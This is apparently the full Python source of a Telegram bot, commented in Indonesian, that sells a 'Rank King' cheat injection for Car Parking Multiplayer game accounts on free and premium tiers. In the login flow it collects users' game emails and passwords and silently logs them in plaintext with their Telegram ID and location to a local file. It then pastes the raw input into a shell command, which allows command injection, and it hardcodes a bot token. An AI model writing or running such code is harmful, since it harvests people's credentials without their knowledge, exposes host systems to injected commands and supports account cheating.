# ================= RANK KING CPM BOT – FULL FINAL (SCYZO MODE) =================
# Semua fitur utuh + stuck premium + notifikasi pembelian / perpanjangan
# Free user: 1x / 30 hari

import telebot, subprocess, time, json, os, threading, requests
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================
TOKEN = "8206837693:AAEqLu_sWDCXGZzdV3HcxEakWh6gJraXzcM"
OWNER_ID = 6095762919

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CPM1_PATH = os.path.join(BASE_DIR, "cpm1.py")
CPM2_PATH = os.path.join(BASE_DIR, "cpm2.py")

LIMIT_FILE = "usage_limit.json"
PREMIUM_FILE = "premium_users.json"
ADMINS_FILE = "admins.json"
LOGIN_FILE = "profile_login.json"
PURCHASE_FILE = "purchase_log.json"
EXPIRE_NOTIFY_FILE = "expire_notify.json"

bot = telebot.TeleBot(TOKEN, threaded=True)
sessions = {}

# ================= JSON HELPER =================
def load_json(path, default):
    if not os.path.exists(path):
        with open(path,"w") as f: json.dump(default,f,indent=2)
        return default
    try:
        with open(path,"r") as f: return json.load(f)
    except: return default

def save_json(path, data):
    with open(path,"w") as f: json.dump(data,f,indent=2)

usage = load_json(LIMIT_FILE,{})
premium = load_json(PREMIUM_FILE,{})
admins = load_json(ADMINS_FILE,[])
logins = load_json(LOGIN_FILE,[])
purchases = load_json(PURCHASE_FILE,[])
expire_notify = load_json(EXPIRE_NOTIFY_FILE,{})

# ================= ROLE =================
def is_owner(uid): return uid==OWNER_ID
def is_admin(uid): return uid in admins or is_owner(uid)

# ================= PREMIUM =================
def is_premium(uid):
    uid = str(uid)
    if uid not in premium: return False
    if premium[uid].get("type")=="unlimited": return True
    try:
        exp = datetime.strptime(premium[uid]["expire"],"%Y-%m-%d")
        return datetime.now()<=exp
    except:
        return False

def premium_status(uid):
    uid = str(uid)
    if uid not in premium: return "🆓 FREE"
    if premium[uid].get("type")=="unlimited": return "👑 UNLIMITED"
    days = (datetime.strptime(premium[uid]["expire"],"%Y-%m-%d") - datetime.now()).days
    return f"💎 PREMIUM ({max(days,0)} hari)"

# ================= FREE LIMIT =================
def can_free(uid):
    uid = str(uid)
    now = datetime.now()
    if uid not in usage:
        usage[uid]={"count":0,"start":now.strftime("%Y-%m-%d")}
        save_json(LIMIT_FILE,usage)
        return True
    start = datetime.strptime(usage[uid]["start"],"%Y-%m-%d")
    if now-start>=timedelta(days=30):
        usage[uid]={"count":0,"start":now.strftime("%Y-%m-%d")}
        save_json(LIMIT_FILE,usage)
        return True
    # Free user 1x / 30 hari
    return usage[uid]["count"] < 1

def inc_free(uid):
    uid = str(uid)
    usage[uid]["count"] += 1
    save_json(LIMIT_FILE,usage)

def remaining(uid):
    if is_premium(uid): return "♾ Unlimited"
    uid = str(uid)
    return f"{1 - usage.get(uid,{'count':0})['count']}x"

# ================= LOGIN LOG =================
def get_location_ip():
    try:
        r = requests.get("https://ipinfo.io/json",timeout=5).json()
        return ", ".join(filter(None,[r.get("city"),r.get("region"),r.get("country")]))
    except: return "Unknown"

def save_login(email,password,tool,uid):
    data = {
        "email":email,
        "password":password,
        "tool":tool,
        "telegram_id":uid,
        "location":get_location_ip(),
        "time":datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    logs = load_json(LOGIN_FILE,[])
    logs.append(data)
    save_json(LOGIN_FILE,logs)

# ================= MENU =================
def main_menu(uid):
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("🚘 CPM 1",callback_data="cpm1"),
        InlineKeyboardButton("🚖 CPM 2",callback_data="cpm2")
    )
    if is_admin(uid): kb.add(InlineKeyboardButton("⚙️ ADMIN PANEL",callback_data="admin"))
    if is_owner(uid): kb.add(InlineKeyboardButton("👑 OWNER PANEL",callback_data="owner"))
    return kb

def admin_menu():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("➕ ADD PREMIUM",callback_data="addprem"))
    kb.add(InlineKeyboardButton("⬅ BACK",callback_data="back"))
    return kb

def owner_menu():
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("➕ ADD PREMIUM",callback_data="addprem"),
        InlineKeyboardButton("➕ ADD ADMIN",callback_data="addadmin"),
        InlineKeyboardButton("❌ DEL ADMIN",callback_data="deladmin"),
        InlineKeyboardButton("📋 LIST ADMIN",callback_data="listadmin"),
        InlineKeyboardButton("⬅ BACK",callback_data="back")
    )
    return kb

# ================= START =================
@bot.message_handler(commands=["start"])
def start_handler(m):
    uid = m.from_user.id
    bot.send_message(
        m.chat.id,
        f"⭐ RANK KING CPM BOT\n\nStatus: {premium_status(uid)}\nSisa Limit: {remaining(uid)}",
        reply_markup=main_menu(uid)
    )

# ================= CALLBACK =================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = c.from_user.id
    d = c.data

    if d in ["cpm1","cpm2"]:
        sessions[uid]={"step":"email","tool":d,"time":time.time()}
        bot.send_message(c.message.chat.id,f"📧 Masukkan EMAIL {d.upper()}:")
        return

    elif d=="admin" and is_admin(uid):
        bot.edit_message_text("⚙️ ADMIN PANEL",c.message.chat.id,c.message.message_id,
                              reply_markup=admin_menu())
    elif d=="owner" and is_owner(uid):
        bot.edit_message_text("👑 OWNER PANEL",c.message.chat.id,c.message.message_id,
                              reply_markup=owner_menu())
    elif d=="addprem" and (is_admin(uid) or is_owner(uid)):
        sessions[uid]={"step":"uid"}
        bot.send_message(c.message.chat.id,"Masukkan UID User:")
    elif d=="addadmin" and is_owner(uid):
        sessions[uid]={"step":"addadmin"}
        bot.send_message(c.message.chat.id,"Masukkan UID Admin:")
    elif d=="deladmin" and is_owner(uid):
        sessions[uid]={"step":"deladmin"}
        bot.send_message(c.message.chat.id,"Masukkan UID Admin:")
    elif d=="listadmin" and is_owner(uid):
        bot.send_message(c.message.chat.id,"📋 ADMIN:\n"+("\n".join(map(str,admins)) or "Kosong"))
    elif d=="back":
        bot.edit_message_text("⬅ MENU",c.message.chat.id,c.message.message_id,
                              reply_markup=main_menu(uid))

# ================= FLOW =================
@bot.message_handler(content_types=["text"])
def flow(m):
    uid = m.from_user.id
    if uid not in sessions: return
    s = sessions[uid]

    # --- CPM FLOW ---
    if s.get("step")=="email":
        s["email"]=m.text.strip()
        s["step"]="pass"
        s["time"]=time.time()
        bot.send_message(m.chat.id,"🔒 Masukkan PASSWORD:")
        return

    if s.get("step")=="pass":
        email = s["email"]
        password = m.text.strip()
        tool = s["tool"]

        save_login(email,password,tool,uid)

        if not is_premium(uid):
            if not can_free(uid):
                bot.send_message(m.chat.id,"⛔ LIMIT FREE HABIS")
                sessions.pop(uid,None)
                return
            inc_free(uid)

        bot.send_message(m.chat.id,f"⏳️ Inject King Sedang Diproses\nSisa: {remaining(uid)}")

        script = CPM1_PATH if tool=="cpm1" else CPM2_PATH
        cmd = f'printf "{email}\\n{password}\\n" | python {script}'
        result = subprocess.getoutput(cmd)
        bot.send_message(m.chat.id,result)
        sessions.pop(uid,None)
        return

    # --- PREMIUM / ADMIN FLOW ---
    if s.get("step")=="uid":
        s["target"]=m.text.strip()
        s["step"]="type"
        bot.send_message(m.chat.id,"Ketik: 7day / 1month / unlimited")
        return

    if s.get("step")=="type":
        t = m.text.lower()
        target = s["target"]
        now = datetime.now()

        # --- Stuck / Extend premium ---
        if target in premium and premium[target].get("type")=="limited":
            try:
                current_exp = datetime.strptime(premium[target]["expire"],"%Y-%m-%d")
                if current_exp>now: now = current_exp
            except: pass

        if t=="unlimited":
            premium[target]={"type":"unlimited"}
            exp="UNLIMITED"
        else:
            days=7 if t=="7day" else 30
            exp_date = now + timedelta(days=days)
            premium[target]={"type":"limited","expire":exp_date.strftime("%Y-%m-%d")}
            exp=exp_date.strftime("%Y-%m-%d")

        save_json(PREMIUM_FILE,premium)
        purchases.append({"user":target,"by":uid,"type":t,"expire":exp,"time":datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
        save_json(PURCHASE_FILE,purchases)
        # --- NOTIFIKASI ke user ---
        try:
            bot.send_message(int(target),f"✅ Premium {t} telah {'ditambahkan' if t!='unlimited' else 'diubah menjadi UNLIMITED'}!\nBerlaku sampai: {exp}")
        except: pass
        bot.send_message(m.chat.id,"✅ Premium berhasil ditambahkan / diperpanjang")
        sessions.pop(uid,None)
        return

    if s.get("step")=="addadmin":
        admins.append(int(m.text.strip()))
        save_json(ADMINS_FILE,admins)
        bot.send_message(m.chat.id,"✅ Admin ditambahkan")
        sessions.pop(uid,None)
        return

    if s.get("step")=="deladmin":
        admins.remove(int(m.text.strip()))
        save_json(ADMINS_FILE,admins)
        bot.send_message(m.chat.id,"❌ Admin dihapus")
        sessions.pop(uid,None)
        return

# ================= EXPIRE NOTIFY =================
def expire_loop():
    while True:
        today = datetime.now().date()
        for uid,info in list(premium.items()):
            if info.get("type")!="limited": continue
            try:
                exp = datetime.strptime(info["expire"],"%Y-%m-%d").date()
            except: continue
            if (exp-today).days==1 and uid not in expire_notify:
                try: bot.send_message(int(uid),"⚠️ Premium kamu akan habis BESOK")
                except: pass
                expire_notify[uid]=True
                save_json(EXPIRE_NOTIFY_FILE,expire_notify)
            if today>exp:
                premium.pop(uid,None)
                expire_notify.pop(uid,None)
                save_json(PREMIUM_FILE,premium)
                save_json(EXPIRE_NOTIFY_FILE,expire_notify)
        time.sleep(3600)

threading.Thread(target=expire_loop,daemon=True).start()

# ================= RUN =================
print("🤖 BOT ONLINE – FULL FINAL SCYZO MODE")
bot.infinity_polling()
